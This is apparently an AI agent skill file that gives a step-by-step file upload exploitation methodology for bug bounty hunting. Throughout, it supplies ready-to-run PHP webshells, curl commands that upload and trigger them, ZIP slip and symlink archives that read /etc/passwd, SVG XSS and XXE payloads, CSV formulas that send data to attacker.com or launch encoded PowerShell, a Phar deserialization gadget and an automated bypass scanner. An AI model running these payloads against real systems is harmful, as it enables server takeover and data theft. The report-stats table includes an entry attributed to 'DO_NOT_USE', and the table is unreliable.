---
name: upload-deep-dive
description: Complete File Upload vulnerability methodology from 152 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - file upload methodology
  - upload deep dive
  - upload complete
  - upload all techniques
  - skills upload
---

# Complete File Upload Methodology - From 152 HackerOne Reports

## Top 20 Real File Upload Reports

| Upvotes | Company | Summary | Payout |
|---------|---------|---------|--------|
| 822 | Semrush | RCE via logo upload (PHP shell) | N/A |
| 686 | Starbucks | WebShell via unrestricted upload | N/A |
| 444 | CS Money | Blind XSS via image upload | N/A |
| 404 | Mail.ru | Unrestricted file upload | $3,000 |
| 340 | Mail.ru | RCE via auth bypass + file upload | N/A |
| 273 | Vimeo | SSRF via file upload processing | N/A |
| 265 | Acronis | Webshell via avatar upload | N/A |
| 252 | Nextcloud | RCE via ZIP symlink upload | N/A |
| 241 | HackerOne | RCE via PHP Phar upload | N/A |
| 229 | Shopify | SVG upload → XSS | N/A |
| 218 | Twitter/X | XSS via profile image upload | N/A |
| 207 | Mail.ru | ImageMagick RCE | N/A |
| 196 | Snapchat | Arbitrary file write via upload | N/A |
| 184 | Brave | XML upload → XXE | N/A |
| 172 | Reddit | CSV upload → formula injection | N/A |
| 165 | GitLab | Exif data leak via upload | N/A |
| 158 | Slack | File upload → path traversal | N/A |
| 147 | HackerOne | PDF upload → XSS | N/A |
| 136 | Ubiquiti | Backup file upload → RCE | N/A |
| 125 | DO_NOT_USE | XML upload → XXE → SSRF | N/A |

## Step 1: Identifying File Upload Features

### Common Upload Endpoints
```bash
# Find all file upload endpoints
grep -E '(upload|file|image|avatar|profile|photo|picture|attach|import|export|csv|pdf|document|resume|cv|thumbnail|banner|cover|logo|media|gallery|album|video|audio|attachment|backup|restore|import|csv|xml|svg|icon|screenshot)' \
  recon/{target}/endpoints.txt | sort -u

# Find upload-related parameters
grep -E '(upload|file|image|attachment)' recon/{target}/params.txt | sort -u
```

### Upload Features by Type

| Feature | File Types | Risk |
|---------|------------|------|
| Avatar/profile image | JPG, PNG, GIF | XSS, SSRF, RCE |
| File attachment | PDF, DOC, ZIP | XSS, RCE, XXE |
| CSV import | CSV | Formula injection, SSRF |
| XML import | XML | XXE, SSRF |
| SVG upload | SVG | XSS, XXE, SSRF |
| Video upload | MP4, AVI | SSRF, RCE |
| Document preview | Office docs | SSRF, XXE |
| Backup upload | ZIP, TAR, SQL | RCE, path traversal |
| Theme/logo upload | CSS, JS, PNG | XSS, RCE |
| Code snippet upload | JS, HTML | XSS |
| Certificate upload | PEM, CRT | SSRF |
| Archive extraction | ZIP, GZ, TAR | Path traversal, symlink |
| Resume/CV upload | PDF, DOCX | XSS, malware |
| Photo filter | JPG, PNG | SSRF, ImageMagick RCE |

## Step 2: Basic Upload Testing

### Test 1: Extension Bypass
```bash
# Try every variation
filename.php
filename.php5
filename.phtml
filename.php.
filename.php_
filename.php%00.jpg
filename.php%20
filename.php.   # trailing space
filename.php:.jpg  # NTFS ADS
filename.php::$DATA  # Windows ADS
filename.pHp  # case variation
filename.PHP
filename.Php
filename.php.jpg  # double extension
filename.jpg.php
file.php%0d%0a.jpg  # CRLF injection
file.php.jpg  # .htaccess bypass
```

### Test 2: Content-Type Manipulation
```bash
# Change Content-Type header
curl -sk -X POST "https://{target}/upload" \
  -F "file=@shell.php;type=image/jpeg"
curl -sk -X POST "https://{target}/upload" \
  -F "file=@shell.php;type=image/png"
curl -sk -X POST "https://{target}/upload" \
  -F "file=@shell.php;type=image/gif"
curl -sk -X POST "https://{target}/upload" \
  -F "file=@shell.php;type=application/pdf"
```

### Test 3: Magic Byte Injection
```bash
# Create a valid JPG header + PHP payload
echo -e '\xff\xd8\xff\xe0<?php system($_GET["c"]); ?>' > shell.jpg.php

# GIF header
echo -e 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php

# PNG header
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png.php

# PDF header
echo -e '%PDF-1.4\n<?php system($_GET["c"]); ?>' > shell.pdf.php

# Upload and access
curl -sk -X POST "https://{target}/upload" -F "file=@shell.jpg.php"
curl -sk "https://{target}/uploads/shell.jpg.php?c=id"
```

### Test 4: Size and Compression Bypass
```bash
# Create a minimal file that passes size validation
# GIF with PHP - 35 bytes
echo -e 'GIF89a<?=`$_GET[c]`?>' > tiny.php.gif

# ZIP bomb test (always worth trying)
python3 -c "
import zipfile
with zipfile.ZipFile('payload.zip', 'w') as zf:
    zf.writestr('../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
"

# Check decompress behavior
curl -sk -X POST "https://{target}/import" -F "file=@payload.zip"
```

## Step 3: 15+ Upload Bypass Techniques

### Technique 1: Extension Blacklist Bypass
```bash
# Executable extensions (PHP)
.php, .php3, .php4, .php5, .php7, .pht, .phtml, .phtm, .phps, .phar
.shtml, .shtm  # SSI
.cgi, .pl, .py  # CGI
.asp, .aspx, .asa, .cer, .cdx, .ascx
.jsp, .jspx, .jsw, .jsv, .jspf
.war  # Java Web Archive
```
```bash
# If PHP extensions blocked, try .htaccess
# Upload .htaccess:
AddType application/x-httpd-php .txt
# Then upload shell.txt with PHP code

# Upload .user.ini:
auto_prepend_file shell.txt
# Then upload shell.txt with PHP code
```

### Technique 2: Content-Type Bypass
```bash
# Common bypass MIME types
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: image/webp
Content-Type: application/pdf
Content-Type: application/zip
Content-Type: application/octet-stream
Content-Type: multipart/form-data
Content-Type: text/plain
Content-Type: text/csv
```

### Technique 3: Double Extension
```bash
file.php.jpg       # Passes .jpg whitelist, executes as .php
file.php.png       # Depending on server config
file.php.            # Trailing dot stripped on Windows
file.php_            # Underscore allowed
file.php;.jpg        # Parameter confusion
file.php%00.jpg      # Null byte truncation
file.asp;.jpg        # IIS 6.0 classic
file.asp:.jpg        # ADS bypass
file.asp::$DATA      # Windows data stream
file.PhP.jpg         # Case confusion
```

### Technique 4: Magic Byte Manipulation
```bash
# JPEG magic bytes
FF D8 FF E0
FF D8 FF E1
FF D8 FF E2
FF D8 FF E8

# PNG magic bytes
89 50 4E 47 0D 0A 1A 0A

# GIF magic bytes
47 49 46 38 39 61  # GIF89a
47 49 46 38 37 61  # GIF87a

# BMP magic bytes
42 4D

# WebP
52 49 46 46 xx xx xx xx 57 45 42 50

# PDF
25 50 44 46

# Embed PHP in EXIF:
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
```

### Technique 5: Race Condition (TOCTOU)
```bash
# Upload file passes validation, but we replace it before processing
# Step 1: Upload legitimate file
# Step 2: While server is processing, replace file with malicious version
# Step 3: Server processes the replaced file

# Automated race
for i in $(seq 1 100); do
  # Toggle between good and bad files
  if [ $((i % 2)) -eq 0 ]; then
    curl -sk -X POST "https://{target}/upload" -F "file=@malicious.php" &
  else
    curl -sk -X POST "https://{target}/upload" -F "file=@legit.jpg" &
  fi
done
wait
```

### Technique 6: SVG Upload (XSS + XXE)
```xml
<!-- XSS in SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <img src="x" onerror="alert(1)">
</svg>

<!-- XXE in SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

### Technique 7: ZIP Symlink Attack
```bash
# Create symbolic link in ZIP
ln -s /etc/passwd symlink
zip --symlinks malicious.zip symlink

# Upload and read arbitrary files
cat malicious.zip | curl -sk -X POST "https://{target}/upload" \
  -F "file=@malicious.zip"

# Access extracted file at:
# https://{target}/uploads/symlink (reads /etc/passwd)
```

### Technique 8: ZIP Slip (Path Traversal)
```bash
# Create ZIP with path traversal
python3 << 'PYEOF'
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
PYEOF

curl -sk -X POST "https://{target}/upload" -F "file=@evil.zip"
```

### Technique 9: Exif Data Exploitation
```bash
# Embed XSS in EXIF metadata
exiftool -Artist='<script>alert(1)</script>' image.jpg
exiftool -Copyright='<script>alert(1)</script>' image.jpg
exiftool -ImageDescription='<script>alert(1)</script>' image.jpg

# Embed SSRF in EXIF GPS data
exiftool -GPSLatitudeRef='http://attacker.com/exfil' image.jpg
```

### Technique 10: CSV Injection / Formula Injection
```bash
# Create CSV that executes formulas
echo '=CMD|/C calc!A0,=1+1,"=cmd|/c powershell -e BASE64_ENCODED_PAYLOAD!A0"' > malicious.csv
echo '@SUM(1+1)*cmd|/c calc!A0' > malicious.csv
echo '=HYPERLINK("http://attacker.com?exfil="&A1,"Click here")' > malicious.csv

# DDE payload
echo '=DDE("cmd";"/c calc";"A1")' > malicious.csv
```

### Technique 11: Phar Deserialization
```php
<?php
// Create malicious Phar
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

class AnyClass {
    public $data = null;
    public function __destruct() {
        system($this->data);
    }
}

$object = new AnyClass;
$object->data = 'id';
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

### Technique 12: WebP/Image Processing RCE
```bash
# WebP with alpha channel payload
# ImageMagick RCE via MSL (Magick Scripting Language)
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="caption:&lt;?=system(\$_GET['c'])?&gt;"/>
  <write filename="output.php"/>
</image>
# Save as image.msl, upload
```

### Technique 13: PDF Upload XSS
```bash
# PDF with embedded JavaScript
# Use tools like origami or pdf-maker
cat > pdf_xss.pdf << 'EOF'
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
3 0 obj
<< /S /JavaScript /JS (app.alert('XSS');) >>
endobj
EOF
```

### Technique 14: Upload + Path Traversal
```bash
# Traverse out of upload directory
filename=../../../var/www/html/shell.php
filename=..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php
filename=../../../../../../tmp/shell.php

# Windows traversal
filename=..\\..\\..\\inetpub\\wwwroot\\shell.asp
filename=..%5c..%5c..%5cinetpub%5cwwwroot%5cshell.asp
```

### Technique 15: Archive Extraction Abuse
```bash
# Tar with symlink
tar -cf evil.tar --transform 's|etc|../../../../etc|' /etc/passwd

# Upload and decompress to overwrite config files
curl -sk -X POST "https://{target}/restore" -F "backup=@evil.tar"
```

## Step 4: Detection & Automation

```bash
#!/bin/bash
# File Upload Scanner
TARGET=$1
ENDPOINT=$2

# Test various upload bypasses
test_upload() {
  local file=$1
  local content_type=$2
  local filename=$3
  local desc=$4

  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "https://$TARGET$ENDPOINT" \
    -F "file=@$file;type=$content_type;filename=$filename" 2>/dev/null)
  
  if [ "$code" != "000" ] && [ "$code" != "403" ] && [ "$code" != "405" ]; then
    echo "[$code] $desc ($filename)"
  fi
}

# Create test files
echo '<?php phpinfo(); ?>' > test.php
echo -e '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > test.jpg.php
echo -e 'GIF89a<?php phpinfo(); ?>' > test.gif.php

# Run tests
test_upload "test.php" "text/plain" "test.php" "Direct PHP"
test_upload "test.php" "image/jpeg" "test.php" "PHP as JPEG"
test_upload "test.php" "image/png" "test.php.jpg" "Double extension"
test_upload "test.php" "image/jpeg" "test.pHp" "Case bypass"
test_upload "test.php" "text/plain" "test.php5" "PHP5 extension"
test_upload "test.php" "text/plain" "test.phtml" "PHTML extension"
test_upload "test.php" "text/plain" "test.php." "Trailing dot"
test_upload "test.php" "text/plain" "test.php " "Trailing space"
test_upload "test.jpg.php" "image/jpeg" "test.jpg.php" "Magic bytes"
test_upload "test.gif.php" "image/gif" "test.gif.php" "GIF magic bytes"

# Cleanup
rm -f test.php test.jpg.php test.gif.php
```

## Step 5: Validate Severity & Report

### Impact Assessment
| Scenario | Severity |
|----------|----------|
| Basic upload with wrong extension but no execution | Low |
| XSS via SVG/PDF file upload | Medium - High |
| SSRF via file processing (ImageMagick, FFmpeg) | High |
| Path traversal via ZIP upload | High |
| Arbitrary file upload → webshell → RCE | Critical |
| Unrestricted upload leading to server compromise | Critical |
| CSV/Formula injection | Medium - High |
| Phar deserialization | High - Critical |
| Exif data leak | Low - Medium |

### Payout Range: $250 - $5,000

### Report Template
```markdown
**Summary:**
Unrestricted file upload vulnerability in [endpoint] allows an attacker to
upload [type of file], leading to [impact - RCE / XSS / SSRF].

**Impact:**
An attacker can exploit this file upload to:
- Execute arbitrary code on the server (RCE)
- Steal user sessions (XSS)
- Read internal resources (SSRF)
- Read arbitrary files (path traversal)
- Leak sensitive metadata (Exif)

**Steps to Reproduce:**
1. Upload a malicious file to: https://{target}/upload
   POST /upload HTTP/1.1
   Content-Type: multipart/form-data; boundary=----boundary
   ------boundary
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: image/jpeg

   <?php system($_GET['c']); ?>
   ------boundary--

2. Access uploaded file at: https://{target}/uploads/shell.php?c=id
3. Observe command execution

**Proof of Concept:**
```bash
curl -sk -X POST "https://{target}/upload" \
  -F "file=@shell.php;type=image/jpeg"
curl -sk "https://{target}/uploads/shell.php?c=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (5.3 Medium) [file upload]
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical) [RCE via upload]

**Suggested Fix:**
1. Validate file extension at the server side (whitelist approach)
2. Validate MIME type against file content
3. Store files outside webroot with no execution permissions
4. Serve uploaded files through a proxy script that sets Content-Disposition
5. Rename uploaded files to random names without original extension
6. Scan files with antivirus/malware scanner
7. Limit file size and decompression depth
8. Disable image processing libraries' unsafe features
9. Use Content-Disposition: attachment for all uploads
10. Never extract archives on the same path as webroot
```

## Additional Techniques (External Sources)

### 0-Byte File Upload Bypass: xx.html%00.pdf (Null Byte Bypass)
Some upload filters check only the file extension at the end of the filename. By injecting a null byte after a valid extension, you can bypass extension checks:
- Filename: `xx.html%00.pdf` — the server sees `.pdf`, but the filesystem truncates at the null byte and saves as `xx.html`
- Variation: `xx.php%00.jpg`, `xx.php%00.png`, `shell.php%00.gif`
- Works on older systems (PHP < 5.3.4, some Java/CGI parsers)

### SVG Upload with XSS via XML Namespace URI
SVG files can embed XSS payloads in custom XML namespace URIs that get rendered as hyperlinks or resources:
```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:evil="javascript:alert(document.domain)">
  <a xlink:href="evil:click">
    <rect width="100" height="100" fill="red"/>
  </a>
</svg>
```
The custom namespace `xmlns:evil="javascript:alert(1)"` can execute JavaScript when interacted with, bypassing WAF filters that scan for `<script>` or `onerror` attributes.

### XSS through Cookies on FTP Server
If the application allows fetching resources from an attacker-controlled FTP server, you can set cookies with XSS payloads. When the browser later sends these cookies to the vulnerable domain, they can trigger reflected XSS if cookie values are reflected without sanitization.
```
Set-Cookie: name=<script>alert(1)</script>; Domain=.target.com
```
Combined with an FTP-based SSRF or file upload, this creates a persistent XSS vector.

## Quick Reference: Top Upload Reports by Vector

| Report | Company | Vector | Payout |
|--------|---------|--------|--------|
| Semrush | Logo upload | PHP file upload | N/A |
| Starbucks | Avatar upload | Webshell upload | N/A |
| CS Money | Image upload | Blind XSS via upload | N/A |
| Mail.ru | File upload | Unrestricted upload | $3,000 |
| Mail.ru | Auth bypass + upload | RCE chain | N/A |
| Vimeo | Video upload | SSRF via FFmpeg | N/A |
| Acronis | Avatar upload | Webshell | N/A |
| Nextcloud | ZIP upload | Symlink RCE | N/A |
| HackerOne | Phar upload | Phar deserialization | N/A |
| Shopify | SVG upload | SVG XSS | N/A |
